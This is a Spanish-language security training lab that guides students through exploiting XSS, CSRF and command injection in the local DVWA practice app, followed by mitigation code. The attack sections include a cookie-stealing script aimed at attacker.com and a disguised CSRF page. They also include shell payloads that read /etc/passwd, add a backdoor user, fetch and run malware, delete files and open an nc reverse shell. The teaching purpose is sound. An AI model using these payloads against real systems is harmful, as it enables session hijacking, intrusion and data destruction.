# Lab 1.2: Exploración de Vulnerabilidades con DVWA

**Duración:** 75 minutos
**Dificultad:** Básica-Intermedia
**Facilitador:** Facilitador 2 (técnico)

---

## 🎯 Objetivos

Al finalizar este laboratorio, serás capaz de:

1. Explotar vulnerabilidades **XSS (Cross-Site Scripting)**
2. Explotar vulnerabilidades **CSRF (Cross-Site Request Forgery)**
3. Explotar vulnerabilidades **Command Injection**
4. Entender el impacto real de cada vulnerabilidad
5. Identificar técnicas de mitigación efectivas

**Nota:** SQL Injection está cubierto en el Lab 1.1, por lo que este lab se enfoca en otras vulnerabilidades críticas del OWASP Top 10.

---

## 📋 Pre-requisitos

- ✅ Docker Desktop instalado y corriendo
- ✅ Navegador web (Chrome, Firefox o Edge)
- ✅ Conocimientos básicos de HTML y JavaScript

---

## 🛠️ Preparación: Levantar DVWA

### Paso 1: Descargar y ejecutar DVWA

```bash
# Descargar imagen de DVWA
docker pull vulnerables/web-dvwa

# Ejecutar contenedor
docker run --rm -it -p 80:80 vulnerables/web-dvwa
```

**Resultado esperado:**
```
...
AH00558: apache2: Could not reliably determine the server's fully qualified domain name
Apache/2.4.41 (Ubuntu) configured -- resuming normal operations
```

### Paso 2: Acceder a DVWA

1. Abrir navegador en: **http://localhost**
2. Click en **"Create / Reset Database"**
3. Login con credenciales:
   - **Usuario:** `admin`
   - **Contraseña:** `password`

### Paso 3: Configurar nivel de seguridad

1. Ir a **"DVWA Security"** (menú izquierdo)
2. Seleccionar **"Low"** (para comenzar)
3. Click en **"Submit"**

---

## 🎓 Contexto del Laboratorio

DVWA (Damn Vulnerable Web Application) es una aplicación web PHP/MySQL **intencionalmente vulnerable** creada por OWASP para practicar técnicas de pentesting en un entorno seguro.

**Analogía:** Es como un gimnasio de seguridad donde puedes practicar "hackear" sin consecuencias legales.

⚠️ **ADVERTENCIA:** NUNCA uses estas técnicas en aplicaciones reales sin autorización explícita por escrito.

---

## 🔥 Vulnerabilidad 1: XSS Reflejado (Reflected XSS) - 20 min

### ¿Qué es XSS Reflejado?

**XSS (Cross-Site Scripting)** = Inyección de código JavaScript malicioso que se ejecuta en el navegador de la víctima.

**Analogía:** Es como poner un letrero falso que engaña a las personas. Cuando alguien lo lee, hace algo que no debería (como dar su contraseña).

### Tipos de XSS:
1. **Reflejado** (Reflected) - El código malicioso viene del request (URL, formulario)
2. **Almacenado** (Stored) - El código se guarda en la BD y afecta a todos los usuarios
3. **DOM-based** - El código se ejecuta modificando el DOM del navegador

---

### Ejercicio 1.1: Explotación Básica de XSS Reflejado

**Objetivo:** Inyectar JavaScript en el campo de búsqueda

1. Ir a **"XSS (Reflected)"** en el menú
2. En el campo **"What's your name?"**, introducir:
   ```html
   <script>alert('XSS')</script>
   ```
3. Click en **"Submit"**

**Resultado esperado:**
- ✅ Aparece un alert popup con el mensaje "XSS"
- ✅ Esto confirma que el código JavaScript se ejecutó

**¿Por qué funciona?**
```php
// Código vulnerable en DVWA (simulado):
$name = $_GET['name'];
echo "Hello " . $name;

// Si name = <script>alert('XSS')</script>
// El HTML resultante será:
// Hello <script>alert('XSS')</script>
// Y el navegador lo ejecuta!
```

---

### Ejercicio 1.2: Robo de Cookies con XSS

**Objetivo:** Demostrar cómo un atacante puede robar cookies de sesión

1. En el mismo campo, introducir:
   ```html
   <script>alert(document.cookie)</script>
   ```

**Resultado esperado:**
- Aparece un alert mostrando las cookies de sesión
- Esto incluye `PHPSESSID` que identifica tu sesión

**¿Qué podría hacer un atacante real?**
```html
<!-- Enviar cookies a un servidor del atacante -->
<script>
  var cookies = document.cookie;
  var img = new Image();
  img.src = 'http://attacker.com/steal.php?c=' + cookies;
</script>
```

**Impacto:**
- 🔴 Robo de sesión (session hijacking)
- 🔴 Secuestro de cuenta
- 🔴 Robo de datos sensibles

---

### Ejercicio 1.3: XSS Almacenado (Stored XSS)

1. Ir a **"XSS (Stored)"** en el menú
2. En el campo **"Message"**, introducir:
   ```html
   <script>alert('XSS Persistente!')</script>
   ```
3. En **"Name"**, poner tu nombre
4. Click en **"Sign Guestbook"**

**Resultado esperado:**
- ✅ Cada vez que CUALQUIER usuario cargue esta página, verá el alert
- ✅ El código JavaScript se guardó en la base de datos

**¿Por qué es más peligroso?**
- Afecta a **TODOS** los usuarios, no solo al atacante
- Persiste en el tiempo (hasta que se limpie la BD)
- No requiere enviar link malicioso a la víctima

---

### 📝 Ejercicio de Mitigación: ¿Cómo Prevenir XSS?

**Cambiar nivel de seguridad a "Medium":**
1. Ir a **"DVWA Security"**
2. Seleccionar **"Medium"**
3. Intentar los mismos ataques

**¿Qué cambió?**
- DVWA ahora escapa algunos caracteres usando `str_replace()`
- Algunos payloads básicos ya no funcionan

**Intenta bypass:**
```html
<!-- Bypass 1: Usar mayúsculas -->
<SCRIPT>alert('XSS')</SCRIPT>

<!-- Bypass 2: Usar evento onload -->
<img src=x onerror=alert('XSS')>

<!-- Bypass 3: Usar SVG -->
<svg/onload=alert('XSS')>
```

**Mitigación CORRECTA en código real:**
```csharp
// C# - Usar HtmlEncoder
using System.Text.Encodings.Web;

string userInput = Request.Query["name"];
string safe = HtmlEncoder.Default.Encode(userInput);
// <script>alert('XSS')</script>
// Se convierte en:
// &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
```

**Controles ISO 27002:**
- **Control 8.28:** Secure coding - Sanitizar inputs y encode outputs

**OWASP Top 10:**
- **A03:2021** - Injection (XSS es un tipo de injection)

---

## 🔐 Vulnerabilidad 2: CSRF (Cross-Site Request Forgery) - 20 min

### ¿Qué es CSRF?

**CSRF** = Engañar al navegador de un usuario autenticado para que ejecute acciones sin su consentimiento.

**Analogía:** Es como darle a alguien un formulario pre-llenado y hacer que lo firme sin leerlo.

---

### Ejercicio 2.1: Cambiar Contraseña sin Consentimiento

1. **Asegurarse de estar logueado en DVWA**
2. Ir a **"CSRF"** en el menú
3. Observar el formulario de cambio de contraseña
4. Cambiar la contraseña a `newpassword123`
5. **Observar la URL resultante:**
   ```
   http://localhost/vulnerabilities/csrf/?password_new=newpassword123&password_conf=newpassword123&Change=Change
   ```

**¿Notaste algo importante?**
- ✅ El cambio de contraseña es un **GET request**
- ✅ No hay token CSRF de validación
- ✅ Si un usuario autenticado visita esa URL, su contraseña cambia SIN su consentimiento

---

### Ejercicio 2.2: Crear Ataque CSRF

**Objetivo:** Crear una página HTML maliciosa que cambie la contraseña de la víctima

1. Crear archivo `csrf-attack.html` en tu escritorio:

```html
<!DOCTYPE html>
<html>
<head>
    <title>¡Gana un iPhone Gratis!</title>
</head>
<body>
    <h1>¡Felicidades! Has ganado un iPhone 14 Pro</h1>
    <p>Haz click en el botón para reclamar tu premio:</p>
    <button onclick="alert('Premio enviado!')">Reclamar Premio</button>

    <!-- Ataque CSRF oculto -->
    <img src="http://localhost/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change" style="display:none;">

    <!-- O usar iframe oculto -->
    <iframe src="http://localhost/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change" style="display:none;"></iframe>
</body>
</html>
```

2. **Abrir ese archivo en el navegador (mientras aún estás logueado en DVWA)**
3. **¡Tu contraseña se cambió automáticamente!**

---

### Ejercicio 2.3: Verificar el Ataque

1. Intentar login en DVWA con la contraseña original: `password`
   - ❌ Falla
2. Intentar login con: `hacked123` o `pwned`
   - ✅ Funciona

**¡Has sido "hackeado" por CSRF!**

---

### 📝 Ejercicio de Mitigación: ¿Cómo Prevenir CSRF?

**Cambiar nivel de seguridad a "Medium":**
1. Ir a **"DVWA Security"** → **"Medium"**
2. Ir a **"CSRF"**
3. Intentar el mismo ataque

**¿Qué cambió?**
- DVWA ahora valida el **HTTP Referer header**
- El ataque falla si vienes de un dominio diferente

**Pero... ¿es suficiente?**
- ❌ NO - El Referer puede ser falsificado o bloqueado

**Mitigación CORRECTA en código real:**

```csharp
// C# ASP.NET Core - Usar Anti-Forgery Tokens
// En el formulario:
<form method="post">
    @Html.AntiForgeryToken()
    <input type="password" name="newPassword" />
    <button type="submit">Cambiar Contraseña</button>
</form>

// En el controller:
[HttpPost]
[ValidateAntiForgeryToken]
public IActionResult ChangePassword(string newPassword)
{
    // El token se valida automáticamente
    // Si no coincide, el request es rechazado
}
```

**Controles ISO 27002:**
- **Control 8.28:** Secure coding - Implementar protección CSRF

**OWASP Top 10:**
- **A01:2021** - Broken Access Control

---

## 💻 Vulnerabilidad 3: Command Injection - 25 min

### ¿Qué es Command Injection?

**Command Injection** = Inyectar comandos del sistema operativo en la aplicación para que los ejecute.

**Analogía:** Es como decirle a un asistente "envía un email a Juan" pero en realidad dices "envía un email a Juan Y borra todos los archivos".

---

### Ejercicio 3.1: Ping Básico

1. Ir a **"Command Injection"** en el menú
2. En el campo **"Enter an IP address"**, introducir:
   ```
   127.0.0.1
   ```
3. Click en **"Submit"**

**Resultado esperado:**
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.042 ms
...
```

**¿Qué está pasando detrás?**
```php
// Código vulnerable (simulado):
$ip = $_POST['ip'];
$output = shell_exec("ping -c 4 " . $ip);
echo $output;
```

---

### Ejercicio 3.2: Inyectar Comandos con `;`

**Objetivo:** Ejecutar comandos adicionales usando el separador `;`

1. En el campo IP, introducir:
   ```
   127.0.0.1; ls -la
   ```

**Resultado esperado:**
- ✅ Se ejecuta `ping 127.0.0.1`
- ✅ Y LUEGO se ejecuta `ls -la` (lista archivos del servidor)

**Explicación:**
```bash
# El comando completo ejecutado es:
ping -c 4 127.0.0.1; ls -la

# El ; separa comandos en Linux/Unix
# Es equivalente a:
ping -c 4 127.0.0.1
ls -la
```

---

### Ejercicio 3.3: Inyectar Comandos con `&&`

1. En el campo IP, introducir:
   ```
   127.0.0.1 && whoami
   ```

**Resultado esperado:**
- ✅ Se ejecuta ping
- ✅ Y si tiene éxito, se ejecuta `whoami` (muestra el usuario actual)

**Explicación:**
- `&&` = Ejecuta el segundo comando SOLO si el primero tiene éxito
- `||` = Ejecuta el segundo comando SOLO si el primero falla
- `|` = Pipe - La salida del primer comando es input del segundo

---

### Ejercicio 3.4: Leer Archivos Sensibles

**Objetivo:** Leer el archivo `/etc/passwd` (contiene usuarios del sistema)

1. Introducir:
   ```
   127.0.0.1; cat /etc/passwd
   ```

**Resultado esperado:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
```

**¿Qué otros comandos peligrosos podría ejecutar un atacante?**
```bash
# Crear usuario backdoor
; useradd hacker -p password123

# Descargar y ejecutar malware
; wget http://attacker.com/malware.sh && bash malware.sh

# Borrar archivos
; rm -rf /var/www/html/*

# Establecer reverse shell
; nc attacker.com 4444 -e /bin/bash
```

**Impacto:**
- 🔴 Ejecución de código remoto (RCE)
- 🔴 Compromiso total del servidor
- 🔴 Robo de datos
- 🔴 Instalación de backdoors

---

### Ejercicio 3.5: Bypass de Validación (Medium Level)

1. Cambiar seguridad a **"Medium"**
2. Intentar: `127.0.0.1; ls`
   - ❌ Falla (filtra `;` y otros caracteres)

**Intentar bypass con encoding o alternativas:**

```bash
# Bypass 1: Usar && en lugar de ;
127.0.0.1 && ls

# Bypass 2: Usar | (pipe)
127.0.0.1 | cat /etc/passwd

# Bypass 3: Usar salto de línea (URL encoded: %0a)
127.0.0.1%0als

# Bypass 4: Usar sustitución de comandos
127.0.0.1 `whoami`
```

---

### 📝 Ejercicio de Mitigación: ¿Cómo Prevenir Command Injection?

**Cambiar nivel de seguridad a "High" o "Impossible":**

**¿Qué hace DVWA en "Impossible"?**
1. Valida que el input sea una IP válida con regex
2. NO ejecuta comandos shell directamente
3. Usa funciones nativas de PHP (`checkdnsrr()`)

**Mitigación CORRECTA en código real:**

```csharp
// C# - NUNCA ejecutar comandos directamente con input del usuario

// ❌ VULNERABLE:
string ip = Request.Form["ip"];
var process = Process.Start("ping", ip);  // NO HACER ESTO

// ✅ CORRECTO:
// Opción 1: Validar input estrictamente
if (IPAddress.TryParse(ip, out var validIp))
{
    // Solo proceder si es IP válida
    // Y usar librería nativa en lugar de shell
    var ping = new Ping();
    var result = ping.Send(validIp);
}
else
{
    return BadRequest("IP inválida");
}

// Opción 2: Usar whitelist de valores permitidos
var allowedIps = new[] { "192.168.1.1", "10.0.0.1" };
if (allowedIps.Contains(ip))
{
    // Proceder
}
```

**Controles ISO 27002:**
- **Control 8.28:** Secure coding - Validar inputs, NO ejecutar comandos shell

**OWASP Top 10:**
- **A03:2021** - Injection (Command Injection)

---

## 📊 Actividad Final: Comparativa de Vulnerabilidades (10 min)

Completa la siguiente tabla con tu experiencia:

| Vulnerabilidad | Severidad | Facilidad de Explotación | Impacto | ¿Viste algo similar en tu código? |
|----------------|-----------|-------------------------|---------|----------------------------------|
| XSS Reflejado | 🟠 ALTA | Fácil | Robo de sesión, defacement | |
| XSS Almacenado | 🔴 CRÍTICA | Fácil | Afecta a todos los usuarios | |
| CSRF | 🟠 ALTA | Media | Acciones no autorizadas | |
| Command Injection | 🔴 CRÍTICA | Media | Compromiso total del servidor | |

---

## ✅ Entregables

1. **Screenshots de cada vulnerabilidad explotada:**
   - XSS Reflejado con alert
   - XSS Almacenado en el guestbook
   - CSRF cambiando contraseña
   - Command Injection listando archivos

2. **Tabla de comparativa completa**

3. **Respuestas a preguntas de reflexión:**
   - ¿Cuál vulnerabilidad te pareció más peligrosa? ¿Por qué?
   - ¿Has visto código similar en tu aplicación?
   - ¿Qué técnica de mitigación implementarías primero?

---

## 🔗 Mapeo a Estándares

### ISO 27002:2022
- **Control 8.28:** Secure coding
  - Todas las vulnerabilidades se previenen con codificación segura

### OWASP Top 10 2021
| Vulnerabilidad | OWASP |
|----------------|-------|
| XSS | A03:2021 - Injection |
| CSRF | A01:2021 - Broken Access Control |
| Command Injection | A03:2021 - Injection |

### CWE Top 25
- **CWE-79:** Cross-site Scripting (XSS)
- **CWE-352:** Cross-Site Request Forgery (CSRF)
- **CWE-78:** OS Command Injection

---

## 💡 Preguntas de Reflexión

1. **¿Por qué XSS Almacenado es más peligroso que XSS Reflejado?**

2. **¿En qué se diferencia CSRF de otras vulnerabilidades?**

3. **¿Qué harías si encontraras Command Injection en tu código de producción?**

4. **¿Cómo validarías que tu mitigación de XSS es efectiva?**

---

## ⭐ [OPCIONAL] Explora Más Vulnerabilidades

Si terminas antes, explora estas vulnerabilidades en DVWA:

- **File Upload** - Subir web shell
- **File Inclusion** - LFI (Local File Inclusion)
- **SQL Injection (Blind)** - Explotación sin ver resultados directos
- **Weak Session IDs** - Predecir IDs de sesión

**Tiempo estimado:** 20-30 minutos adicionales

---

## 🧹 Limpieza

Al terminar el laboratorio:

```bash
# Detener y eliminar contenedor DVWA
docker stop <container_id>
docker rm <container_id>

# O si usaste --rm, se eliminó automáticamente al detenerlo
```

---

## 🎓 Resumen

### Lo que Aprendiste:
✅ Explotar XSS Reflejado y Almacenado
✅ Explotar CSRF para ejecutar acciones no autorizadas
✅ Explotar Command Injection para ejecutar comandos en el servidor
✅ Entender el impacto real de cada vulnerabilidad
✅ Identificar técnicas de mitigación efectivas

### Próximo Paso:
**Lab 1.3:** Reconocimiento básico con nmap, Nikto, whatweb

---

## 📚 Referencias

- **DVWA GitHub:** https://github.com/digininja/DVWA
- **OWASP XSS Guide:** https://owasp.org/www-community/attacks/xss/
- **OWASP CSRF Guide:** https://owasp.org/www-community/attacks/csrf
- **OWASP Command Injection:** https://owasp.org/www-community/attacks/Command_Injection

---

**Versión:** 1.0
**Última actualización:** Diciembre 2025
